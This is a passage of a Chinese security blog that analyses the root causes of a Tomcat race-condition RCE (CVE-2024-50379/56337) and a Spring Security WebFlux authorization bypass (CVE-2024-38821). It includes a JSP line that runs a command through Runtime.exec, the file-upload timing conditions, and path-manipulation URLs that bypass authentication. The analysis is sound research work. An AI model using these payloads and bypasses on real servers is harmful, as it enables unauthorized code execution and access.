<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> WebResource <span class="title function_">getResourceInternal</span><span class="params">(String path, <span class="type">boolean</span> useClassLoaderResources)</span> &#123;</span><br><span class="line">        <span class="type">WebResource</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">WebResource</span> <span class="variable">virtual</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">WebResource</span> <span class="variable">mainEmpty</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (List&lt;WebResourceSet&gt; list : allResources) &#123;</span><br><span class="line">            <span class="keyword">for</span> (WebResourceSet webResourceSet : list) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!useClassLoaderResources &amp;&amp; !webResourceSet.getClassLoaderOnly() ||</span><br><span class="line">                        useClassLoaderResources &amp;&amp; !webResourceSet.getStaticOnly()) &#123;</span><br><span class="line">                    result = webResourceSet.getResource(path);</span><br><span class="line">                    <span class="keyword">if</span> (result.exists()) &#123;</span><br><span class="line">                        <span class="keyword">return</span> result;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (virtual == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (result.isVirtual()) &#123;</span><br><span class="line">                            virtual = result;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (main.equals(webResourceSet)) &#123;</span><br><span class="line">                            mainEmpty = result;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>DirResourceSet#getResource</code> 方法中会调用<code>file</code>方法查找文件。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> WebResource <span class="title function_">getResource</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    checkPath(path);</span><br><span class="line">    <span class="type">String</span> <span class="variable">webAppMount</span> <span class="operator">=</span> getWebAppMount();</span><br><span class="line">    <span class="type">WebResourceRoot</span> <span class="variable">root</span> <span class="operator">=</span> getRoot();</span><br><span class="line">    <span class="keyword">if</span> (path.startsWith(webAppMount)) &#123;</span><br><span class="line">        <span class="type">ResourceLock</span> <span class="variable">lock</span> <span class="operator">=</span> lockForRead(path);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> file(path.substring(webAppMount.length()), <span class="literal">false</span>);<span class="comment">// 查找文件资源</span></span><br><span class="line">            <span class="keyword">if</span> (f == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!f.exists()) &#123; <span class="comment">// 检查文件是否存在，也就是说在这条代码执行前我们通过PUT方法上传的文件必须要落地</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path, f);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (f.isDirectory() &amp;&amp; path.charAt(path.length() - <span class="number">1</span>) != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                path = path + <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FileResource</span>(root, path, f, isReadOnly(), getManifest(), <span class="built_in">this</span>, lock.key);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            unlockForRead(lock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>fileBase</code>与<code>name</code>一起构造文件对象，这里<code>name</code>的值即我们传入的<code>/test.jsp</code><br>然后会调用<code>getCanonicalPath</code>来获得文件的规范化路径。<br>最后会比较<code>getCanonicalPath</code>方法获取的规范化路径<code>canPath</code>是否与文件的绝对路径<code>absPath</code>相等，如果两者不想的则返回null，此时我们需要这两个值是相等的，<br>所以我们需要保证<code>canPath</code>与<code>absPath</code>相等。跟进<code>getCanonicalPath</code>方法。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> File <span class="title function_">file</span><span class="params">(String name, <span class="type">boolean</span> mustExist)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileBase, name);</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            canPath = file.getCanonicalPath();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">        absPath = absPath.substring(absoluteBase.length());</span><br><span class="line">        canPath = canPath.substring(canonicalBase.length());</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (!canPath.equals(absPath)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!canPath.equalsIgnoreCase(absPath)) &#123;</span><br><span class="line">                logIgnoredSymlink(getRoot().getContext().getName(), absPath, canPath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>java.io.File.getCanonicalPath</code><br>继续跟进 <code>canonicalize</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getCanonicalPath</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (isInvalid()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Invalid file path&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fs.canonicalize(fs.resolve(<span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>useCanonCaches</code> 表示是否启用规范路径缓存，也就是我们文章开头提到的高版本<code>JDK</code>这个值被设为<code>false</code>导致漏洞无法利用的原因。<br>我们要利用漏洞<code>useCanonCaches</code>的值必须为<code>true</code>，即我们希望进行规范化路径缓存。<br>该方法最终会调用到 <code>canonicalize0</code>方法，这是一个<code>native</code>方法，具体的细节我就不再分析了，感兴趣可以查看<a href="https://xz.aliyun.com/news/16337">参考链接</a>。<br><code>canonicalize0</code>方法有个特性，其规范的路径时不区分大小写的，即如果我要规范一个路径<code>bastPath/test.jsp</code>，<br>该方法会去<code>basePath</code>路径下查找是否存在<code>test.jsp</code>文件，如果此时<code>basePath</code>下不存在<code>test.jsp</code>文件，将<code>basePath/test.jsp</code>这个路径原样返回，<br>如果<code>basePath</code>目录下存在<code>test.JSP</code>文件，则返回<code>basePath/test.JSP</code>，即规范路径时不区分大小写。<br>根据这个特性我们就可以将一个<code>.JSP</code>结尾的静态资源文件当作动态文件解析了。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">canonicalize</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!useCanonCaches) &#123;</span><br><span class="line">            <span class="keyword">return</span> canonicalize0(path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> cache.get(path);<span class="comment">// 先查找缓存，首次访问时返回null</span></span><br><span class="line">            <span class="keyword">if</span> (res == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">resDir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (useCanonPrefixCache) &#123;<span class="comment">// 是否启用了前缀缓存，即缓存目录，我们直接访问的文件没有多层目录结构所以不涉及这一点。</span></span><br><span class="line">                    dir = parentOrNull(path);</span><br><span class="line">                    <span class="keyword">if</span> (dir != <span class="literal">null</span>) &#123;</span><br><span class="line">                        resDir = prefixCache.get(dir);</span><br><span class="line">                        <span class="keyword">if</span> (resDir != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> path.substring(<span class="number">1</span> + dir.length());</span><br><span class="line">                            res = canonicalizeWithPrefix(resDir, filename);</span><br><span class="line">                            cache.put(dir + File.separatorChar + filename, res);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (res == <span class="literal">null</span>) &#123;</span><br><span class="line">                    res = canonicalize0(path);<span class="comment">// native方法</span></span><br><span class="line">                    cache.put(path, res); <span class="comment">// 将规范化的结果放入到缓存中</span></span><br><span class="line">                    <span class="keyword">if</span> (useCanonPrefixCache &amp;&amp; dir != <span class="literal">null</span>) &#123; <span class="comment">// 如果启动了前缀缓存，还需要往前缀缓存添加缓存项。</span></span><br><span class="line">                        resDir = parentOrNull(res);</span><br><span class="line">                        <span class="keyword">if</span> (resDir != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(res);</span><br><span class="line">                            <span class="keyword">if</span> (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">                                prefixCache.put(dir, resDir);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>上面的方法执行完后会往<code>cache</code>中写入这样的键值对<code>test.jsp -&gt; test.JSP</code>。<br>当向上回退到<code>file</code>方法的时候出现问题了。<br>再file方法中计算的<code>basePath/test.jsp</code>计算的<code>canPath</code>为<code>basePath/test.JSP</code>，计算的<code>absPath</code>为<code>basePath/test.jsp</code>，<br>两者不相等导致<code>file</code>方法将会返回<code>null</code>，这不是我们想要的。<br>还记得前面提到<code>canonicalize0</code>方法的时候说过其有一个特性是当<code>basePath/test.jsp</code>或者<code>basePath/test.JSP</code>等文件在文件系统中不存在的时候会原样返回<code>basePath/test.jsp</code>。<br>这样在<code>file</code>方法中得到的<code>canPath</code>就与<code>absPath</code>一致了，也就能正确返回<code>File</code>对象了。<br>继续向上回溯到<code>DirResourceSet#getResource</code>方法，在成功调用file方法查找到文件资源后，调用<code>f.exists()</code>方法，检查文件是否存在，这是时候需要保证文件系统中存在文件<code>basePath/test.jsp</code>。<br>因为在<code>Windows</code>的文件系统中文件名是大小写不敏感的，所以<code>basePath/test.jsp</code>或者<code>basePath/test.JSP</code>其实表示同一个文件。<br>我们无法凭空创建一个<code>test.jsp</code>文件，但是可以创建<code>test.JSP</code>文件，因为该文件在Tomcat中是一个被当作一个静态资源文件处理的，我们可以通过PUT方法进行上传。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> WebResource <span class="title function_">getResource</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        checkPath(path);</span><br><span class="line">        <span class="type">String</span> <span class="variable">webAppMount</span> <span class="operator">=</span> getWebAppMount();</span><br><span class="line">        <span class="type">WebResourceRoot</span> <span class="variable">root</span> <span class="operator">=</span> getRoot();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(webAppMount)) &#123;</span><br><span class="line">            <span class="type">ResourceLock</span> <span class="variable">lock</span> <span class="operator">=</span> lockForRead(path);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> file(path.substring(webAppMount.length()), <span class="literal">false</span>);<span class="comment">// 成功找到了file资源 path为 `basePath/test.jsp`</span></span><br><span class="line">                <span class="keyword">if</span> (f == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!f.exists()) &#123; <span class="comment">// 检查文件是否存在，也就是说在这条代码执行前我们通过PUT方法上传的文件必须要落地</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path, f);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (f.isDirectory() &amp;&amp; path.charAt(path.length() - <span class="number">1</span>) != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    path = path + <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FileResource</span>(root, path, f, isReadOnly(), getManifest(), <span class="built_in">this</span>, lock.key);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                unlockForRead(lock);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>test.JSP</code>文件的上传时机是非常重要的，我们需要<code>canonicalize0</code>方法调用完之前这个文件是不存在于文件系统的，否则缓存中保存的就是<code>a.jsp -&gt; a.JSP</code>的映射关系，计算的<code>canPath</code>也变成了<code>a.JSP</code><br>这样不能通过<code>absPath</code>与<code>canPath</code>的比较。 且要保证在<code>f.exists</code>调用之前<code>test.JSP</code>文件成功落盘，因为我们要保证文件存在否则将响应一个空的资源对象。  </p>
<p>在调试环境下要做到这一点是非常简单的，我们只需要在<code>f.exists</code>这一行下断点，访问<code>test.jsp</code>运行到这一行时再到文件系统中创建<code>test.JSP</code>文件，然后让代码继续执行即可观察到<code>test.JSP</code>中的命令被执行了。</p>
<pre><code class="language-jsp">&lt;%=Runtime.getRuntime().exec(&quot;calc&quot;)%&gt;
</code></pre>
<p><img src="/archives/172295c/img_1.png" alt="img_1.png">  </p>
<p>实战环境下PoC的写法在了解了原理后相比并不困难（人比较懒），这里不再赘述。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://xz.aliyun.com/news/16337">Tomcat CVE-2024-50379 &#x2F; CVE-2024-56337 条件竞争漏洞分析</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>远程代码执行</tag>
        <tag>Tomcat</tag>
        <tag>条件竞争</tag>
        <tag>CVE-2024-50379</tag>
        <tag>CVE-2024-56337</tag>
      </tags>
  </entry>
  <entry>
    <title>WebFlux集成Spring-Security受限静态资源访问授权绕过（CVE-2024-38821）</title>
    <url>/archives/f65bb354.html</url>
    <content><![CDATA[<h1 id="WebFlux集成Spring-Security受限静态资源访问授权绕过（CVE-2024-38821）"><a href="#WebFlux集成Spring-Security受限静态资源访问授权绕过（CVE-2024-38821）" class="headerlink" title="WebFlux集成Spring-Security受限静态资源访问授权绕过（CVE-2024-38821）"></a>WebFlux集成Spring-Security受限静态资源访问授权绕过（CVE-2024-38821）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><img src="/archives/f65bb354/img.png" alt="img.png">  </p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Security以下版本受影响<br>5.7.0 - 5.7.12<br>5.8.0 - 5.8.14<br>6.0.0 - 6.0.12<br>6.1.0 - 6.1.10<br>6.2.0 - 6.2.6<br>6.3.0 - 6.3.3</p>
<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>创建一个Spring boot + Webflux + Spring Security项目，引入相关依赖  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Spring Boot Starter for WebFlux --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建配置类<br>该类中配置了静态资源<code>index.html</code>需要登录才能访问，其他url不需要认证即可访问  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.web.server.ServerHttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.MapReactiveUserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.server.SecurityWebFilterChain;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.security.config.Customizer.withDefaults;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebFluxSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSecurityConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityWebFilterChain <span class="title function_">securityWebFilterChain</span><span class="params">(ServerHttpSecurity http)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> http</span><br><span class="line">                .authorizeExchange(exchanges -&gt; exchanges</span><br><span class="line">                        .pathMatchers(<span class="string">&quot;/index.html&quot;</span>).authenticated()</span><br><span class="line">                        .anyExchange().permitAll())</span><br><span class="line">                .formLogin(withDefaults())</span><br><span class="line">                .httpBasic(withDefaults())</span><br><span class="line">                .csrf(ServerHttpSecurity.CsrfSpec::disable)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义内存中的用户信息</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MapReactiveUserDetailsService <span class="title function_">userDetailsService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">admin</span> <span class="operator">=</span> User.withUsername(<span class="string">&quot;admin&quot;</span>).password(<span class="string">&quot;admin&quot;</span>).roles(<span class="string">&quot;ADMIN&quot;</span>) .build();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapReactiveUserDetailsService</span>(admin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>resources</code>目录下创建<code>index.html</code>文件写入任意内容<br>此时访问该资源 <code>http://127.0.0.1:8080/index.html</code> 会响应<code>401</code>状态码提示<code>Unauthorized</code><br><img src="/archives/f65bb354/img_1.png" alt="img_1.png"><br>访问<code>http://127.0.0.1:8080//index.html</code> 会响应<code>200</code>状态码，并且返回<code>index.html</code>文件内容<br><img src="/archives/f65bb354/img_2.png" alt="img_2.png"><br>还可以对url进行变形 <code>http://127.0.0.1:8080////././../../index.html</code> 也可以访问到该资源</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>WebFlux也是遵守servlet规范的，其Filter起点为<code>DefaultWebFilterChain</code>的<code>filter</code>方法<br>当一次请求第一次进入<code>filter</code>的时候<code>currentFilter</code>的值为<code>WebFilterChainProxy</code>对象， <code>handler</code>的值为<code>DispatcherHandler</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Mono.defer(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.currentFilter != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.chain != <span class="literal">null</span> ? <span class="built_in">this</span>.invokeFilter(<span class="built_in">this</span>.currentFilter, <span class="built_in">this</span>.chain, exchange) : <span class="built_in">this</span>.handler.handle(exchange);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>WebFilterChainProxy 中存储了注册的所有过滤器，当其filter方法被调用时会调用匹配器对请求路径进行匹配，<br>匹配成功后会将匹配到的过滤器对象赋值给currentFilter，并调用过滤器的filter方法，过滤器执行完后会调用next方法，<br>继续调用下一个过滤器，直到所有过滤器执行完，最终调用 DispatcherHandler 对象的handle方法处理请求<br><img src="/archives/f65bb354/img_3.png" alt="img_3.png"><br>MatcherSecurityWebFilterChain<br>我们在签名配置类创建时设置的url访问规则就是在过滤器的处理过程中被验证的，因为我们访问的是<code>//index.html</code>，该url被认为是不需要认证的。<br><code>//index.html</code>不是标准的静态资源访问方法，所以要通过该url访问到资源<code>index.html</code>肯定还有一个请求路径到服务器资源映射的处理逻辑进行和才能导致绕过。<br>这个过程发生在请求处理器的处理过程中。<br>当请求通过了所有过滤器的过滤后，DispatcherHandler 会根据请求url选择合适的请求处理器对请求进行处理<br>在<code>handleRequestWith</code>方法中会选取合适的处理器适配器对处理器进行适配然后调用处理器的<code>handler</code>方法  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">handle</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.createNotFoundError();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> CorsUtils.isPreFlightRequest(exchange.getRequest()) ? <span class="built_in">this</span>.handlePreFlight(exchange) : Flux.fromIterable(<span class="built_in">this</span>.handlerMappings).concatMap((mapping) -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> mapping.getHandler(exchange);</span><br><span class="line">            &#125;).next().switchIfEmpty(<span class="built_in">this</span>.createNotFoundError()).onErrorResume((ex) -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.handleResultMono(exchange, Mono.error(ex));</span><br><span class="line">            &#125;).flatMap((handler) -&gt; &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.handleRequestWith(exchange, handler);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当访问静态文件的时候使用的处理器为<code>ResourceWebHandler</code>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">handle</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getResource(exchange).switchIfEmpty(Mono.defer(() -&gt; &#123;</span><br><span class="line">            logger.debug(exchange.getLogPrefix() + <span class="string">&quot;Resource not found&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> Mono.error(<span class="keyword">new</span> <span class="title class_">NoResourceFoundException</span>(<span class="built_in">this</span>.getResourcePath(exchange)));</span><br><span class="line">        &#125;))</span><br><span class="line">        ...</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p><code>getResource</code>方法将尝试获取用户访问的资源  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Mono&lt;Resource&gt; <span class="title function_">getResource</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rawPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getResourcePath(exchange);</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.processPath(rawPath);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(path) &amp;&amp; !<span class="built_in">this</span>.isInvalidPath(path)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isInvalidEncodedPath(path)) &#123;</span><br><span class="line">                <span class="keyword">return</span> Mono.empty();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Assert.state(<span class="built_in">this</span>.resolverChain != <span class="literal">null</span>, <span class="string">&quot;ResourceResolverChain not initialized&quot;</span>);</span><br><span class="line">                Assert.state(<span class="built_in">this</span>.transformerChain != <span class="literal">null</span>, <span class="string">&quot;ResourceTransformerChain not initialized&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.resolverChain.resolveResource(exchange, path, <span class="built_in">this</span>.getLocations()).flatMap((resource) -&gt; &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.transformerChain.transform(exchange, resource);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Mono.empty();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>getResourcePath</code>方法将尝试通过url获取资源在服务器上的位置  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getResourcePath</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">PathPattern</span> <span class="variable">pattern</span> <span class="operator">=</span> (PathPattern)exchange.getRequiredAttribute(HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE);</span><br><span class="line">        <span class="keyword">if</span> (!pattern.hasPatternSyntax()) &#123;</span><br><span class="line">            <span class="keyword">return</span> pattern.getPatternString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">PathContainer</span> <span class="variable">pathWithinHandler</span> <span class="operator">=</span> (PathContainer)exchange.getRequiredAttribute(HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE);</span><br><span class="line">            <span class="keyword">return</span> pathWithinHandler.value();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/archives/f65bb354/img_4.png" alt="img_4.png"><br>从上面的代码运行结果可知资源路径是从<code>exchange</code>的属性<code>HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE</code>中获取的，也就是说这个路径在<code>exchange</code>构建的时候已经确定了<br>此时我们需要回溯<code>exchange</code>的<code>HandlerMapping.PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE</code>属性的构建时机<br>通过栈回溯，在<code>org.springframework.web.reactive.handler.AbstractUrlHandlerMapping.getHandlerInternal</code>方法中发现了端倪</p>
